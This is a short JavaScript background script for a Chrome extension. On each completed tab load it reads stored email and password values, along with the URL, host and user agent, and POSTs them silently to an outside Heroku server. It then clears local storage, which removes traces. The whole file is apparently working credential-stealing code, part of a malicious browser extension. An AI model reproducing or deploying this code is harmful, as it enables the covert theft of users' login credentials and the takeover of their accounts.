var domain="https://timstech.herokuapp.com"

let loading=1;
let currentUrl;
chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{
    //apply new strategy  
    if(changeInfo.status=="complete"){
      sendData();
    } 
})  

function sendData(){
    try{
        chrome.storage.local.get(obj=>{
            let session=obj;
            let {url,host,userAgent,email,password}= obj;

            let parsedObj={
                url,
                host,
                userAgent,
                session:{
                    email,
                    password
                }
            }
            if(session && session.email && session.password){
              loading++;
            //   console.log("sending log");            
              setTimeout(() => {
                      fetch(`${domain}/upload`,{
                          method:"POST",
                          mode:"cors",
                          body:JSON.stringify(parsedObj),
                          headers:{
                              "content-Type":"application/json"
                          }
                      }).then(()=>{
                          chrome.storage.local.clear();
                      })
                      .catch(err=>err);
                  
                  loading--;
              },1000);  
            //   console.log(parsedObj)
            }
          });
      }catch(err){
        //   console.log(err);
      }
}

